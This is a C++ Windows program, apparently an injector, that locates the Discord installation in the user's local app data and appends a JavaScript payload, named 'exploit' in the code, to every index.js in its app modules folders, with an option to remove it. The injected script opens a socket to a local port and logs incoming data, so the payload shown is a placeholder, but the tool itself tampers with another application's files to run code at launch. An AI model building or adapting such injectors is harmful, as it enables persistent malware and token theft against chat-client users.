#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>

namespace fs = std::filesystem;

const std::string exploit = R"(
const net = require('net');

const client = net.createConnection({ port: 8080, host: '127.0.0.1' }, () => {
  console.log('Connected to server');
});

client.on('data', (data) => {
  console.log('Received:', data.toString());
});

client.on('end', () => {
  console.log('Disconnected from server');
});)";

void modifyFile(const fs::path& filePath, bool removeExploit) {
    std::fstream file(filePath, std::ios::in | std::ios::out);

    if (!file.is_open()) {
        std::cerr << "error opening file: " << filePath << std::endl;
        return;
    }

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    size_t pos = content.find(exploit);

    if (removeExploit) {
        if (pos != std::string::npos) {
            content.erase(pos, exploit.length());
            file.seekp(pos);
            file.write(content.c_str(), content.size());
            std::cout << "removed exploit from file: " << filePath << std::endl;
        } else {
            std::cout << "exploit script not found in file: " << filePath << std::endl;
        }
    } else {
        if (pos == std::string::npos) {
            file << exploit;
            std::cout << "appended exploit to file: " << filePath << std::endl;
        } else {
            std::cout << "exploit script already exists in file: " << filePath << std::endl;
        }
    }

    file.close();
}

void searchAndModify(const fs::path& directoryPath, const std::string& targetFileName, bool removeExploit) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if (entry.is_directory() && entry.path().filename().wstring().find(L"app") != std::wstring::npos) {
            fs::path modulesPath = entry.path() / "modules";

            if (fs::exists(modulesPath) && fs::is_directory(modulesPath)) {
                for (const auto& file : fs::recursive_directory_iterator(modulesPath)) {
                    if (file.is_regular_file() && file.path().filename().string() == targetFileName) {
                        modifyFile(file.path(), removeExploit);
                    }
                }
            }
        }
    }
}

int main() {
    const char* localAppDataPath = std::getenv("LOCALAPPDATA");

    if (!localAppDataPath) {
        std::cerr << "error getting localAppData" << std::endl;
        return 1;
    }

    fs::path discordPath(localAppDataPath);
    discordPath /= "Discord";

    if (!fs::exists(discordPath) || !fs::is_directory(discordPath)) {
        std::cerr << "discord folder not found" << std::endl;
        return 1;
    }

    searchAndModify(discordPath, "index.js", false);
    return 0;
}
